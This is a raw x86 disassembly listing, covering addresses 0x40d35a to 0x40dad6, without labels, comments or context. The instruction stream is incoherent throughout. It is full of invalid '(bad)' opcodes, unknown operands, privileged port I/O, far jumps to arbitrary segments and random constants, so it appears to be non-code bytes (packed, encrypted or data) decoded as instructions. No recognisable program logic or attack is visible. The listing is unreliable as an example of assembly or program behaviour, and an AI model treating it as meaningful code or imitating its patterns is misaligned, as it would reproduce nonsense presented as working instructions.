  40d35a:	sub    ah,BYTE PTR [esi+edi*2+0x53]
  40d35e:	dec    esp
  40d35f:	loope  0x40d340
  40d361:	hlt    
  40d362:	paddd  mm3,QWORD PTR [ebp+0xe21d63f]
  40d369:	push   eax
  40d36a:	stos   BYTE PTR es:[edi],al
  40d36b:	es inc ecx
  40d36d:	adc    al,0x10
  40d36f:	aaa    
  40d370:	xor    al,0xf
  40d372:	sbb    DWORD PTR [eax-0x44],eax
  40d375:	xchg   ebx,esi
  40d377:	bound  esi,QWORD PTR [ebp-0x64a2cb42]
  40d37d:	add    al,0x1c
  40d37f:	or     DWORD PTR ds:0xb7b3205c,ebx
  40d385:	sub    eax,0xdaf9ee78
  40d38a:	jge    0x40d368
  40d38c:	mov    dl,0xbc
  40d38e:	jb     0x40d377
  40d390:	jnp    0x40d328
  40d392:	mov    ecx,0x50474b64
  40d397:	mov    ah,0x4f
  40d399:	cmp    ebx,DWORD PTR [ebp-0x1df0003f]
  40d39f:	add    ecx,esi
  40d3a1:	cmp    eax,0xd2139367
  40d3a6:	in     eax,dx
  40d3a7:	mov    BYTE PTR [esi],dh
  40d3a9:	cwde   
  40d3aa:	xor    DWORD PTR [eax+0x3],eax
  40d3ad:	in     al,0x60
  40d3af:	lahf   
  40d3b0:	and    DWORD PTR [ecx],edx
  40d3b2:	xchg   DWORD PTR [edx],esp
  40d3b4:	pop    esi
  40d3b5:	aaa    
  40d3b6:	sbb    al,0x7a
  40d3b8:	and    al,0x4c
  40d3ba:	ja     0x40d403
  40d3bc:	mov    bh,0x73
  40d3be:	mov    al,ds:0xc7539cb2
  40d3c3:	mov    BYTE PTR [edi+0xf5f3f6a],al
  40d3c9:	xor    ch,ah
  40d3cb:	out    dx,eax
  40d3cc:	or     eax,0x95c6ce9
  40d3d1:	xchg   BYTE PTR [edi+edi*2+0x68],cl
  40d3d5:	pop    es
  40d3d6:	inc    esp
  40d3d7:	mov    dl,0x57
  40d3d9:	lds    esi,FWORD PTR [esi-0x26d4c397]
  40d3df:	loope  0x40d44d
  40d3e1:	push   eax
  40d3e2:	ins    BYTE PTR es:[edi],dx
  40d3e3:	mov    cl,0x51
  40d3e5:	jecxz  0x40d367
  40d3e7:	sub    cl,BYTE PTR [esp+ebx*8-0x46]
  40d3eb:	xor    DWORD PTR [edi-0x4c234b19],edx
  40d3f1:	daa    
  40d3f2:	mov    ch,0xf4
  40d3f4:	popf   
  40d3f5:	mov    bl,0x55
  40d3f7:	sub    bl,BYTE PTR [esi]
  40d3f9:	or     DWORD PTR [edx-0x2d],edx
  40d3fc:	adc    eax,0xfcf7e000
  40d401:	mov    al,ss:0xcb98dbe6
  40d407:	xor    ah,al
  40d409:	or     DWORD PTR [ecx+0x45],ebp
  40d40c:	loop   0x40d3c0
  40d40e:	mov    ds:0xd725c2c5,al
  40d413:	adc    eax,0x2e2749f1
  40d418:	aaa    
  40d419:	lds    ecx,FWORD PTR [esi+0xe]
  40d41c:	lahf   
  40d41d:	add    DWORD PTR [esi+0x0],ebp
  40d420:	pop    esi
  40d421:	pusha  
  40d422:	out    dx,eax
  40d423:	xchg   esp,eax
  40d424:	or     al,0xc5
  40d426:	adc    BYTE PTR [ebp+0x7281d3d6],bl
  40d42c:	sub    al,0x6
  40d42e:	dec    esp
  40d42f:	dec    ebp
  40d430:	pop    ecx
  40d431:	addr16 (bad) 
  40d433:	fcmovnb st,st(6)
  40d435:	and    DWORD PTR [eax+ebx*8-0x24f4c832],0xb31b9fce
  40d440:	jbe    0x40d443
  40d442:	fwait
  40d443:	mov    bl,0xca
  40d445:	enter  0x511,0x90
  40d449:	sbb    BYTE PTR [edi-0x16],ah
  40d44c:	and    eax,0x5f7417c3
  40d451:	cmp    BYTE PTR [esi+0x6ddcdbd2],dl
  40d457:	push   ecx
  40d458:	scas   eax,DWORD PTR es:[edi]
  40d459:	sub    DWORD PTR [ebp-0x584988df],0xf1b96b7f
  40d463:	psubsw mm3,QWORD PTR [eax-0x3c7e859a]
  40d46a:	leave  
  40d46b:	addr16 (bad) 
  40d46d:	retf   
  40d46e:	pop    ebp
  40d46f:	adc    BYTE PTR [ecx],dh
  40d471:	dec    edx
  40d472:	xchg   DWORD PTR [ebx-0x66aec64d],esp
  40d478:	xor    eax,0x1a332b77
  40d47d:	les    ebx,FWORD PTR [edi-0x1d]
  40d480:	ins    DWORD PTR es:[edi],dx
  40d481:	mov    bh,0xfe
  40d483:	and    al,0xc4
  40d485:	aas    
  40d486:	fs popa 
  40d488:	push   edx
  40d489:	and    eax,DWORD PTR [ebx+eax*1-0x5ca5faeb]
  40d490:	pop    ss
  40d491:	push   0x4c0e1853
  40d496:	push   es
  40d497:	xchg   ecx,eax
  40d498:	cmp    al,0x68
  40d49a:	xor    al,0x3d
  40d49c:	cmp    eax,DWORD PTR [edx]
  40d49e:	fcomip st,st(5)
  40d4a0:	ja     0x40d4a8
  40d4a2:	shl    al,0x19
  40d4a5:	push   es
  40d4a6:	or     eax,0xa11e1a0c
  40d4ab:	cwde   
  40d4ac:	sub    BYTE PTR [edx],0x44
  40d4af:	push   0x43847dd5
  40d4b4:	pop    edx
  40d4b5:	pop    edi
  40d4b6:	xor    edi,DWORD PTR [ecx-0x7ffdd225]
  40d4bc:	cwde   
  40d4bd:	fnsave [esi-0x73]
  40d4c0:	adc    BYTE PTR [ebx+0x39],0x5f
  40d4c4:	out    dx,eax
  40d4c5:	and    bl,bh
  40d4c7:	or     BYTE PTR [eax],bl
  40d4c9:	sub    al,0xa1
  40d4cb:	shl    DWORD PTR [eax-0x286ee813],1
  40d4d1:	cmp    DWORD PTR [ecx+ebp*2],esi
  40d4d4:	lods   al,BYTE PTR ds:[esi]
  40d4d5:	aam    0x2
  40d4d7:	fcmovnb st,st(6)
  40d4d9:	mov    edx,DWORD PTR [ebx]
  40d4db:	dec    ebx
  40d4dc:	xchg   ebx,eax
  40d4dd:	mov    esi,ss
  40d4df:	push   ecx
  40d4e0:	sbb    DWORD PTR ds:0x8ae289c9,ebx
  40d4e6:	mov    ah,0xe3
  40d4e8:	mov    ebx,0x249f8bf3
  40d4ed:	in     al,dx
  40d4ee:	mov    ?,WORD PTR [ebp+0x3c447492]
  40d4f4:	nop
  40d4f5:	test   bl,0xa3
  40d4f8:	push   esp
  40d4f9:	push   ds
  40d4fa:	sbb    ebx,ecx
  40d4fc:	bound  ebp,QWORD PTR [esi-0x37]
  40d4ff:	icebp  
  40d500:	or     BYTE PTR [eax],al
  40d502:	mov    eax,ds:0xc15202ec
  40d507:	in     eax,dx
  40d508:	ja     0x40d505
  40d50a:	je     0x40d4ad
  40d50c:	pop    esi
  40d50d:	enter  0x9af9,0x3
  40d511:	pop    edi
  40d512:	adc    BYTE PTR [ebx],al
  40d514:	xchg   esp,eax
  40d515:	sbb    DWORD PTR [ebx-0x55],ebp
  40d518:	in     al,0xff
  40d51a:	out    0x4b,al
  40d51c:	inc    edx
  40d51d:	pop    ecx
  40d51e:	push   ds
  40d51f:	out    dx,eax
  40d520:	jb     0x40d58d
  40d522:	lods   eax,DWORD PTR ds:[esi]
  40d523:	ins    DWORD PTR es:[edi],dx
  40d524:	sub    esp,ebp
  40d526:	fimul  WORD PTR [ebx-0x2ddfb59d]
  40d52c:	call   0xbe89:0xe86ac0aa
  40d533:	jecxz  0x40d581
  40d535:	pop    edi
  40d536:	fisub  WORD PTR [edx]
  40d538:	inc    edi
  40d539:	neg    cl
  40d53b:	aad    0x76
  40d53d:	(bad)  
  40d53e:	bound  edx,QWORD PTR [esi-0x61]
  40d541:	arpl   sp,si
  40d543:	inc    eax
  40d544:	neg    ebx
  40d546:	ins    BYTE PTR es:[edi],dx
  40d547:	lods   al,BYTE PTR ds:[esi]
  40d548:	adc    DWORD PTR [eax+0x6877dd13],ecx
  40d54e:	jns    0x40d556
  40d550:	jno    0x40d524
  40d552:	out    dx,eax
  40d553:	rcr    DWORD PTR [eax-0x50],cl
  40d556:	fs ins BYTE PTR es:[edi],dx
  40d558:	sbb    eax,0x537bbfa0
  40d55d:	stc    
  40d55e:	jg     0x40d50a
  40d560:	mov    bh,BYTE PTR [esi-0x18]
  40d563:	fs nop
  40d565:	and    edi,DWORD PTR [edi*4-0x7c8ce616]
  40d56c:	cmp    al,0xa2
  40d56e:	sbb    bh,bh
  40d570:	and    al,0xa1
  40d572:	lea    ebx,ds:0xf5bc5e04
  40d578:	xor    al,0x87
  40d57a:	inc    edx
  40d57b:	test   edx,0x500148d7
  40d581:	arpl   WORD PTR [edx-0x11],bx
  40d584:	sbb    ah,BYTE PTR [eax+0x4a1bc595]
  40d58a:	push   cs
  40d58b:	cdq    
  40d58c:	push   0xffffff9c
  40d58e:	add    al,0xc
  40d590:	das    
  40d591:	and    eax,0x2347681c
  40d596:	ret    
  40d597:	jnp    0x40d5dc
  40d599:	mov    ecx,0xeea90fa2
  40d59e:	in     eax,0x52
  40d5a0:	inc    edi
  40d5a1:	lods   eax,DWORD PTR ds:[esi]
  40d5a2:	dec    esp
  40d5a3:	mov    ?,ecx
  40d5a5:	out    dx,al
  40d5a6:	push   0x1cd0313e
  40d5ab:	and    esi,DWORD PTR ds:0x76ce56bf
  40d5b1:	pop    ds
  40d5b2:	xor    eax,0xb7c9ab9f
  40d5b7:	retf   0x2bda
  40d5ba:	push   cs
  40d5bb:	test   al,0x9
  40d5bd:	pop    es
  40d5be:	and    bh,0xd9
  40d5c1:	xor    ebp,0xd45a0f25
  40d5c7:	pop    edx
  40d5c8:	push   edx
  40d5c9:	or     esi,ebp
  40d5cb:	add    edx,DWORD PTR [eax]
  40d5cd:	pop    ss
  40d5ce:	int    0x76
  40d5d0:	inc    ebp
  40d5d1:	test   BYTE PTR [esi+eax*1-0x78624469],bl
  40d5d8:	inc    ecx
  40d5d9:	(bad)  [ecx]
  40d5db:	aam    0xdd
  40d5dd:	(bad)  
  40d5de:	dec    edx
  40d5df:	mov    ecx,0x24fc944c
  40d5e4:	mov    al,0x0
  40d5e6:	fstp   QWORD PTR [ecx-0x50]
  40d5e9:	mov    dl,0x3
  40d5eb:	lods   eax,DWORD PTR ds:[esi]
  40d5ec:	push   ecx
  40d5ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5ee:	dec    ebx
  40d5ef:	mov    ds:0x57b10ae0,eax
  40d5f4:	ret    0x2766
  40d5f7:	call   0xcf77:0x38d082cb
  40d5fe:	push   cs
  40d5ff:	mov    edi,0xc77f06a3
  40d604:	mov    bl,0xff
  40d606:	retf   0x260d
  40d609:	add    al,0x74
  40d60b:	sub    eax,0x2862559b
  40d610:	push   ebx
  40d611:	push   ebx
  40d612:	sbb    BYTE PTR [ecx-0x6421b24d],dh
  40d618:	xlat   BYTE PTR ds:[ebx]
  40d619:	out    0x44,al
  40d61b:	adc    cl,BYTE PTR [edi+esi*8-0x5c71a4ec]
  40d622:	(bad)  
  40d623:	cmp    al,BYTE PTR [esi+edx*8-0x673ba041]
  40d62a:	xchg   edx,eax
  40d62b:	ret    0x7081
  40d62e:	mov    cl,0xec
  40d630:	sbb    al,0xc6
  40d632:	cmp    esp,esi
  40d634:	add    edx,DWORD PTR [eax+0x4]
  40d637:	adc    esp,DWORD PTR [eax+eax*2]
  40d63a:	arpl   WORD PTR [esi+esi*1+0x7c],sp
  40d63e:	mov    esi,0xddf62bcb
  40d643:	cs ja  0x40d63f
  40d646:	sbb    ebx,DWORD PTR [ebx]
  40d648:	icebp  
  40d649:	dec    esp
  40d64a:	mov    cl,0x15
  40d64c:	std    
  40d64d:	pop    esp
  40d64e:	scas   eax,DWORD PTR es:[edi]
  40d64f:	mov    ds:0xc196988d,eax
  40d654:	inc    edx
  40d655:	jnp    0x40d666
  40d657:	mov    edi,0x9aee2831
  40d65c:	sahf   
  40d65d:	shl    DWORD PTR [eiz*4+0x18d49320],1
  40d664:	mov    ds:0x277cfc95,al
  40d669:	fmul   QWORD PTR [edi]
  40d66b:	cmp    al,0x12
  40d66d:	sub    ch,BYTE PTR [esi]
  40d66f:	lds    esi,FWORD PTR [edi]
  40d671:	push   ss
  40d672:	rcr    BYTE PTR [ecx],1
  40d674:	push   ecx
  40d675:	dec    eax
  40d676:	mov    ebx,0xad94ae8f
  40d67b:	(bad)  
  40d67c:	jmp    FWORD PTR [esi-0x17]
  40d67f:	jae    0x40d63e
  40d681:	jno    0x40d696
  40d683:	jge    0x40d676
  40d685:	or     DWORD PTR [edx],ebx
  40d687:	or     DWORD PTR [esp+eax*8],esi
  40d68a:	lock sub DWORD PTR [ebx+0x88bea07],ebp
  40d691:	sub    al,0x54
  40d693:	loopne 0x40d711
  40d695:	cmp    ch,BYTE PTR [edi+0x1065d219]
  40d69b:	fwait
  40d69c:	xor    ebp,edi
  40d69e:	adc    dl,BYTE PTR [ecx]
  40d6a0:	mov    bl,0xd2
  40d6a2:	fimul  DWORD PTR [edi]
  40d6a4:	lods   al,BYTE PTR ds:[esi]
  40d6a5:	lods   eax,DWORD PTR ds:[esi]
  40d6a6:	inc    ebp
  40d6a7:	stc    
  40d6a8:	push   esp
  40d6a9:	xlat   BYTE PTR ds:[ebx]
  40d6aa:	pop    esi
  40d6ab:	(bad)  
  40d6ac:	imul   ecx,DWORD PTR [esi-0x3b],0xffffffc8
  40d6b0:	jl     0x40d691
  40d6b2:	and    ebp,esi
  40d6b4:	and    ecx,DWORD PTR [edx]
  40d6b6:	jne    0x40d692
  40d6b8:	pop    ds
  40d6b9:	dec    ebx
  40d6ba:	fcom   DWORD PTR [esi+0x75]
  40d6bd:	cdq    
  40d6be:	rcr    eax,cl
  40d6c0:	leave  
  40d6c1:	dec    eax
  40d6c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6c3:	cmp    cl,BYTE PTR ds:0xde636dfc
  40d6c9:	ss xor bl,cl
  40d6cc:	xor    al,0xfc
  40d6ce:	sub    ecx,ebp
  40d6d0:	xchg   ecx,eax
  40d6d1:	mov    ?,WORD PTR [ecx-0x11]
  40d6d4:	mov    edx,0x84d508cb
  40d6d9:	xchg   esp,eax
  40d6da:	sub    BYTE PTR [edi+0x10],al
  40d6dd:	pop    edx
  40d6de:	into   
  40d6df:	jae    0x40d742
  40d6e1:	push   eax
  40d6e2:	sbb    eax,0x5affe1
  40d6e7:	jmp    0xfd2217e9
  40d6ec:	ficomp WORD PTR [ebx]
  40d6ee:	cmp    eax,0xba5a8711
  40d6f3:	repz (bad) 
  40d6f5:	fild   QWORD PTR [ecx+0x2e]
  40d6f8:	cmc    
  40d6f9:	data16 adc BYTE PTR [eax-0x6a507019],0x48
  40d701:	jmp    0x93359c9a
  40d706:	jnp    0x40d6dc
  40d708:	or     BYTE PTR [edi],bh
  40d70a:	xchg   dh,al
  40d70c:	gs mov eax,0xea79d2a2
  40d712:	stos   BYTE PTR es:[edi],al
  40d713:	ds inc esp
  40d715:	imul   edi,DWORD PTR [edx-0x11931219],0x6d
  40d71c:	scas   eax,DWORD PTR es:[edi]
  40d71d:	in     eax,dx
  40d71e:	mov    BYTE PTR [ebp-0x32],cl
  40d721:	repz pop edx
  40d723:	outs   dx,DWORD PTR ds:[esi]
  40d724:	and    al,BYTE PTR [eax+esi*1+0x50]
  40d728:	ins    DWORD PTR es:[edi],dx
  40d729:	mov    eax,0x6ce9088e
  40d72e:	jne    0x40d737
  40d730:	sub    eax,eax
  40d732:	call   0x74f0e20a
  40d737:	out    0xcb,eax
  40d739:	push   ecx
  40d73a:	jns    0x40d74a
  40d73c:	mov    al,0x7d
  40d73e:	dec    ecx
  40d73f:	cmp    DWORD PTR [edi+eiz*1],0x18
  40d743:	out    0xd2,eax
  40d745:	cmc    
  40d746:	shl    ebp,0x3e
  40d749:	and    al,0x1e
  40d74b:	imul   DWORD PTR [esi]
  40d74d:	add    dh,BYTE PTR [edi]
  40d74f:	mov    al,0xf5
  40d751:	(bad)  
  40d752:	ins    DWORD PTR es:[edi],dx
  40d753:	or     dl,BYTE PTR [edi+0x64483c1]
  40d759:	sub    edx,ebp
  40d75b:	fadd   QWORD PTR [eax-0x34e5ceb2]
  40d761:	inc    ebp
  40d762:	pusha  
  40d763:	fstp   TBYTE PTR [edx]
  40d765:	mov    ecx,0xe8aa6e1c
  40d76a:	fnstenv [edx-0x36]
  40d76d:	(bad)  
  40d76e:	outs   dx,BYTE PTR ds:[esi]
  40d76f:	mov    eax,0x88961078
  40d774:	mov    cl,0x2c
  40d776:	adc    ecx,DWORD PTR [esp+ebx*4]
  40d779:	and    al,0x6e
  40d77b:	pop    ss
  40d77c:	mul    DWORD PTR [eax+0x6b]
  40d77f:	pop    esp
  40d780:	daa    
  40d781:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d782:	mov    ah,ch
  40d784:	jns    0x40d7db
  40d786:	xor    eax,ecx
  40d788:	push   edx
  40d789:	daa    
  40d78a:	mov    al,0xb0
  40d78c:	sbb    eax,0xdd7cbf22
  40d791:	loopne 0x40d7a8
  40d793:	bound  ebp,QWORD PTR [ecx+0x74]
  40d796:	pushf  
  40d797:	dec    ebp
  40d798:	xchg   ebx,eax
  40d799:	push   ss
  40d79a:	stos   DWORD PTR es:[edi],eax
  40d79b:	je     0x40d7a8
  40d79d:	jo     0x40d801
  40d79f:	(bad)  [esi]
  40d7a1:	or     edx,ebp
  40d7a3:	mov    eax,DWORD PTR [edx-0x6f]
  40d7a6:	repnz out dx,eax
  40d7a8:	and    dl,ch
  40d7aa:	nop
  40d7ab:	ja     0x40d741
  40d7ad:	mov    cs,WORD PTR gs:[ebp-0x4dd4c4de]
  40d7b4:	add    al,0x8f
  40d7b6:	xor    BYTE PTR [eax-0x56],dh
  40d7b9:	dec    edx
  40d7ba:	or     DWORD PTR [ecx-0x62],ebp
  40d7bd:	cmp    ch,BYTE PTR [edx+0x7cc3318e]
  40d7c3:	push   edi
  40d7c4:	or     bl,dl
  40d7c6:	cmp    eax,DWORD PTR [ebx]
  40d7c8:	out    0xca,eax
  40d7ca:	mov    ds:0x2bc16424,eax
  40d7cf:	stos   BYTE PTR es:[edi],al
  40d7d0:	nop
  40d7d1:	inc    esp
  40d7d2:	push   edx
  40d7d3:	sbb    al,0x7d
  40d7d5:	jge    0x40d7fc
  40d7d7:	cmp    cl,BYTE PTR [edi+0x72446dad]
  40d7dd:	mov    bh,0x66
  40d7df:	js     0x40d803
  40d7e1:	mov    ds:0xc9fcb82f,al
  40d7e6:	jbe    0x40d7d3
  40d7e8:	xchg   edx,eax
  40d7e9:	retf   0xc63c
  40d7ec:	mov    cl,BYTE PTR [edi-0x6a82354f]
  40d7f2:	push   cs
  40d7f3:	in     al,dx
  40d7f4:	mov    eax,0x6ba370a5
  40d7f9:	jmp    0xbf8c:0xb298c5c
  40d800:	in     al,0xe0
  40d802:	jne    0x40d824
  40d804:	pop    edx
  40d805:	mov    edi,DWORD PTR [ecx+0x2f]
  40d808:	(bad)  ss:[ebx+esi*1-0x76]
  40d80d:	sti    
  40d80e:	mov    edi,0xb7c7fa33
  40d813:	shl    BYTE PTR [edx-0x34],0x4d
  40d817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d818:	add    ch,BYTE PTR [edx-0x74]
  40d81b:	cwde   
  40d81c:	test   eax,0xe7ea8875
  40d821:	aad    0xc5
  40d823:	xchg   ebp,eax
  40d824:	sbb    ebp,DWORD PTR [edx+0x31756856]
  40d82a:	jno    0x40d7fe
  40d82c:	imul   eax,esi,0xffffffad
  40d82f:	jmp    0xb2f8efd3
  40d834:	mov    esp,0x89c8b8ca
  40d839:	in     eax,dx
  40d83a:	xchg   edi,ebp
  40d83c:	in     eax,0xc0
  40d83e:	sub    DWORD PTR [ecx-0x4b86886f],edx
  40d844:	mov    ch,0x9
  40d846:	icebp  
  40d847:	sti    
  40d848:	xchg   esp,eax
  40d849:	and    DWORD PTR [ecx+0x5a],0xffffff8c
  40d84d:	pop    es
  40d84e:	jae    0x40d8a2
  40d850:	and    BYTE PTR [esi+0x540910e8],al
  40d856:	iret   
  40d857:	jl     0x40d87c
  40d859:	jmp    0x7bd9:0xe72ff8a1
  40d860:	enter  0x1aab,0x67
  40d864:	lock pop ecx
  40d866:	jmp    0x4fbd0782
  40d86b:	pop    es
  40d86c:	aaa    
  40d86d:	push   es
  40d86e:	sti    
  40d86f:	lods   al,BYTE PTR ds:[esi]
  40d870:	jo     0x40d8b4
  40d872:	push   0x79c5d661
  40d877:	xchg   dl,ch
  40d879:	ss daa 
  40d87b:	sub    eax,0x1c200a76
  40d880:	in     ax,0x76
  40d883:	mov    ebx,0x681545f7
  40d888:	and    DWORD PTR [esi-0x31],ebx
  40d88b:	int3   
  40d88c:	mov    BYTE PTR [ecx+0x22],dl
  40d88f:	test   DWORD PTR [edx-0x2],ebp
  40d892:	enter  0x9986,0x76
  40d896:	shl    DWORD PTR [esi],0x88
  40d899:	in     eax,dx
  40d89a:	xchg   edi,eax
  40d89b:	les    esp,FWORD PTR [esi-0x12]
  40d89e:	mov    dl,0x6d
  40d8a0:	add    edx,DWORD PTR [edi-0x1a]
  40d8a3:	xlat   BYTE PTR ds:[ebx]
  40d8a4:	cli    
  40d8a5:	add    ebx,DWORD PTR [edi+0x61471de5]
  40d8ab:	ins    BYTE PTR es:[edi],dx
  40d8ac:	in     al,dx
  40d8ad:	cmp    esi,ebx
  40d8af:	(bad)  
  40d8b0:	out    0xf4,al
  40d8b2:	push   esi
  40d8b3:	xor    ch,BYTE PTR [ebx+0x57022339]
  40d8b9:	into   
  40d8ba:	or     BYTE PTR [esi],bh
  40d8bc:	ss pop ebp
  40d8be:	inc    ebx
  40d8bf:	(bad)  [ebp-0x10]
  40d8c2:	dec    eax
  40d8c3:	mov    ch,0xdb
  40d8c5:	loop   0x40d907
  40d8c7:	push   cs
  40d8c8:	fnstsw WORD PTR [ecx+0x15]
  40d8cb:	jecxz  0x40d8fe
  40d8cd:	sub    eax,0xb78adf99
  40d8d2:	lahf   
  40d8d3:	ins    BYTE PTR es:[edi],dx
  40d8d4:	mov    ch,0xd1
  40d8d6:	and    dh,BYTE PTR [eax+esi*4]
  40d8d9:	retf   0xb4d1
  40d8dc:	sbb    al,0x95
  40d8de:	mov    ebp,0xb80922cf
  40d8e3:	and    DWORD PTR [esi],ebp
  40d8e5:	repnz push 0x50
  40d8e8:	sahf   
  40d8e9:	fadd   QWORD PTR cs:[esp+edx*4-0x3f]
  40d8ee:	mov    dl,0xa8
  40d8f0:	cmp    al,BYTE PTR [eax+0x520a110d]
  40d8f6:	in     al,0xcf
  40d8f8:	add    esi,DWORD PTR [esi-0x692fe32b]
  40d8fe:	pop    edx
  40d8ff:	add    eax,0x3a3b2bb1
  40d904:	cwde   
  40d905:	iret   
  40d906:	imul   ebx,DWORD PTR [ebx+eiz*1+0x79],0xe7c119a5
  40d90e:	lds    esi,FWORD PTR [esi-0x8]
  40d911:	cmp    bh,BYTE PTR [edi+0xedd2027]
  40d917:	mov    ds:0x3daa26f6,eax
  40d91c:	mov    ah,0x6f
  40d91e:	fwait
  40d91f:	jns    0x40d97d
  40d921:	jmp    0x17774ff0
  40d926:	popa   
  40d927:	sar    dl,cl
  40d929:	adc    al,0xd7
  40d92b:	out    dx,eax
  40d92c:	or     ebx,DWORD PTR [esi-0x5e]
  40d92f:	cs or  eax,0x5db52cac
  40d935:	js     0x40d992
  40d937:	adc    eax,0x4d81bba1
  40d93c:	xor    bh,BYTE PTR [edx+0x2db545c5]
  40d942:	imul   ebx,esi,0x8d488ead
  40d948:	dec    ebx
  40d949:	test   DWORD PTR [ecx+0x42],edx
  40d94c:	xchg   edx,eax
  40d94d:	and    al,0x11
  40d94f:	adc    al,0x5f
  40d951:	mov    BYTE PTR [edi-0x5a],ch
  40d954:	mov    ds:0xd46124fd,al
  40d959:	sahf   
  40d95a:	jl     0x40d91a
  40d95c:	(bad)  
  40d95d:	bound  ebx,QWORD PTR [edx]
  40d95f:	xchg   ebp,eax
  40d960:	imul   esp,DWORD PTR [ebx],0xffffffa3
  40d963:	push   ss
  40d964:	cmp    eax,0xbdb495a2
  40d969:	jg     0x40d8f4
  40d96b:	fsubr  st(1),st
  40d96d:	cwde   
  40d96e:	push   esi
  40d96f:	fwait
  40d970:	adc    al,0x19
  40d972:	push   edx
  40d973:	mov    ds:0x8649b5a7,eax
  40d978:	hlt    
  40d979:	pop    ds
  40d97a:	stos   BYTE PTR es:[edi],al
  40d97b:	fwait
  40d97c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d97d:	mov    ah,0x68
  40d97f:	dec    edx
  40d980:	outs   dx,BYTE PTR ds:[esi]
  40d981:	cmp    eax,0x2137d782
  40d986:	out    0x9a,al
  40d988:	popf   
  40d989:	push   ebx
  40d98a:	pusha  
  40d98b:	dec    edx
  40d98c:	mov    edx,0x3e06593f
  40d991:	or     bh,BYTE PTR [esi-0x23]
  40d994:	sub    ecx,DWORD PTR [edx-0x52056493]
  40d99a:	mul    ebx
  40d99c:	xchg   ebx,eax
  40d99d:	mov    ds:0xbdf63fea,eax
  40d9a2:	push   esp
  40d9a3:	fucom  st(2)
  40d9a5:	clc    
  40d9a6:	ja     0x40d9e5
  40d9a8:	rcr    BYTE PTR [edi-0x65],cl
  40d9ab:	loop   0x40d96b
  40d9ad:	retf   0x8ae2
  40d9b0:	sub    al,BYTE PTR [edx-0x55]
  40d9b3:	inc    esp
  40d9b4:	mov    BYTE PTR [eax+esi*8],bl
  40d9b7:	and    dl,BYTE PTR [ecx]
  40d9b9:	retf   
  40d9ba:	dec    esi
  40d9bb:	popf   
  40d9bc:	bound  esp,QWORD PTR [ebp+0x7b2a6c76]
  40d9c2:	imul   esp,ecx,0x7d362fe5
  40d9c8:	xchg   esi,eax
  40d9c9:	dec    eax
  40d9ca:	test   eax,0x94e3dcf8
  40d9cf:	mov    bh,0x19
  40d9d1:	and    al,BYTE PTR [ecx+0x55ae2094]
  40d9d7:	in     al,0x8
  40d9d9:	das    
  40d9da:	jecxz  0x40d964
  40d9dc:	mov    WORD PTR [eax-0x28251dbb],ds
  40d9e2:	ds std 
  40d9e4:	sbb    ecx,DWORD PTR [ebx]
  40d9e6:	sar    BYTE PTR [esi+0x4ce73d96],cl
  40d9ec:	or     ch,BYTE PTR [esi+0xbdb5cd1]
  40d9f2:	retf   
  40d9f3:	mov    ah,0xd5
  40d9f5:	cli    
  40d9f6:	test   BYTE PTR [edx],bl
  40d9f8:	ins    BYTE PTR es:[edi],dx
  40d9f9:	arpl   WORD PTR [eax+0x2308dce5],dx
  40d9ff:	aad    0x80
  40da01:	xadd   DWORD PTR [esi],eax
  40da04:	repnz add al,0x35
  40da07:	jmp    0xa83a6088
  40da0c:	sub    BYTE PTR [ebx],bl
  40da0e:	cmp    cl,BYTE PTR [esi]
  40da10:	or     BYTE PTR [ecx],al
  40da12:	test   DWORD PTR [esi+0x6f],ebp
  40da15:	pop    ebx
  40da16:	cmp    ah,ch
  40da18:	or     ebp,DWORD PTR [ecx]
  40da1a:	leave  
  40da1b:	and    bl,dl
  40da1d:	(bad)  
  40da1e:	push   0x9ff4ce88
  40da23:	enter  0xacd8,0x9
  40da27:	add    al,0x9a
  40da29:	pop    edi
  40da2a:	pop    ss
  40da2b:	dec    ecx
  40da2c:	fwait
  40da2d:	push   0x61007823
  40da32:	loop   0x40dab0
  40da34:	mov    edx,0x27cae060
  40da39:	out    dx,eax
  40da3a:	(bad)  
  40da3c:	mov    BYTE PTR [edi-0x5ae44209],bh
  40da42:	xchg   esi,eax
  40da43:	xchg   ebp,eax
  40da44:	dec    ecx
  40da45:	mov    ds,WORD PTR [eax-0x6cbcd96c]
  40da4b:	std    
  40da4c:	dec    ebx
  40da4d:	aam    0xd
  40da4f:	push   ss
  40da50:	sbb    BYTE PTR [eax+0x44],al
  40da53:	leave  
  40da54:	lahf   
  40da55:	cli    
  40da56:	sub    DWORD PTR [edx],0x49bd1b2c
  40da5c:	dec    eax
  40da5d:	mov    ds:0xded4fa43,al
  40da62:	mul    ebp
  40da64:	lods   al,BYTE PTR ds:[esi]
  40da65:	dec    esp
  40da66:	push   0x74
  40da68:	in     eax,0xe5
  40da6a:	outs   dx,BYTE PTR ds:[esi]
  40da6b:	popa   
  40da6c:	dec    DWORD PTR [esi-0x76]
  40da6f:	or     al,0x38
  40da71:	jbe    0x40da91
  40da73:	fwait
  40da74:	or     BYTE PTR [eax-0x69],bl
  40da77:	add    DWORD PTR [eax+0x21384a2a],ebx
  40da7d:	jmp    DWORD PTR [ebx]
  40da7f:	stc    
  40da80:	mov    ecx,0x2b97becb
  40da85:	xchg   esi,eax
  40da86:	adc    eax,0x889869ef
  40da8b:	sbb    dh,bl
  40da8d:	adc    DWORD PTR [ebx+0x1ed7b6f7],edi
  40da93:	mov    esi,0xafeedd20
  40da98:	mov    dh,0x51
  40da9a:	adc    ebx,DWORD PTR [ecx-0x1abfa38b]
  40daa0:	sub    BYTE PTR [ebp-0x1704eabf],ch
  40daa6:	call   0x3cd1:0x606bd8fc
  40daad:	adc    BYTE PTR [eax+0x1f],0xc1
  40dab1:	loop   0x40da3e
  40dab3:	imul   ebp,DWORD PTR [esi+0xe0ac685],0x26
  40daba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dabb:	into   
  40dabc:	xchg   edx,eax
  40dabd:	jmp    0x57c8:0xdaf00814
  40dac4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dac5:	adc    esp,eax
  40dac7:	mov    BYTE PTR [ebx+ecx*2-0x23],bl
  40dacb:	mov    dh,0x2f
  40dacd:	xchg   BYTE PTR [edx+0x5f],ah
  40dad0:	or     eax,0x3d709a5a
  40dad5:	inc    esp
  40dad6:	xlat   BYTE PTR ds:[ebx]
